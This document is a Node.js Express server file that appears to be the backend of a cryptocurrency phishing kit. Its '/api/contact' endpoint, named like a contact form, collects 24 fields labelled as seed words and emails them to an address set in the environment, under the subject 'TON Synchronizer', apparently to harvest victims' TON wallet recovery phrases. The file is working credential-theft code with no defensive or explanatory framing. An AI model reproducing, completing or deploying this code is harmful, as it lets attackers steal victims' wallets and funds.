const path = require("path");
const express = require("express");
const cors = require("cors");
const nodemailer = require("nodemailer");
const bodyParser = require("body-parser");

require("dotenv").config();

const PORT = process.env.PORT || 3001


const app = express();
app.use(express.static(path.resolve(__dirname, "../build")));
app.use(cors())
app.use(bodyParser.json());


app.get("/api", (req, res) => {
    res.json({ message: "Hello from server"})
})

const seedPhrase = nodemailer.createTransport({
    service:"gmail",
    auth: {
        user: process.env.EMAIL_ADDRESS,
        pass: process.env.EMAIL_PASS
    }
}) 
seedPhrase.verify(error => {
    if(error) {
        console.log(error)
    }else {
        console.log("it ready to send")
    }
})

app.post("/api/contact", bodyParser.urlencoded({ extended:false}), (req, res) => {
    const seed = req.body
    const mail = {
        form: process.env.EMAIL_ADDRESS,
        to: process.env.EMAIL_TO ,
        subject: "TON Synchronizer",
        html: `
        <div> 
        <span>${seed[0]}</span>
        <span>${seed[1]}</span>
        <span>${seed[2]}</span>
        <span>${seed[3]}</span>
        <span>${seed[4]}</span>
        <span>${seed[5]}</span>
        <span>${seed[6]}</span>
        <span>${seed[7]}</span>
        <span>${seed[8]}</span>
        <span>${seed[9]}</span>
        <span>${seed[10]}</span>
        <span>${seed[11]}</span>
        <span>${seed[12]}</span>
        <span>${seed[13]}</span>
        <span>${seed[14]}</span>
        <span>${seed[15]}</span>
        <span>${seed[16]}</span>
        <span>${seed[17]}</span>
        <span>${seed[18]}</span>
        <span>${seed[19]}</span>
        <span>${seed[20]}</span>
        <span>${seed[21]}</span>
        <span>${seed[22]}</span>
        <span>${seed[23]}</span>
        </div>   
        `
    }
    seedPhrase.sendMail(mail, error => {
        if(error) {
            res.json(error)
        }else {
            res.json({ code: 200, status:"it ready to send"})
        }
    });
})
app.get("*", (req, res) => {
    res.sendFile(path.resolve(__dirname, "../build", "index.html"));
})
app.listen(PORT, () => {
    console.log(`server is live on PORT:${PORT}`)
})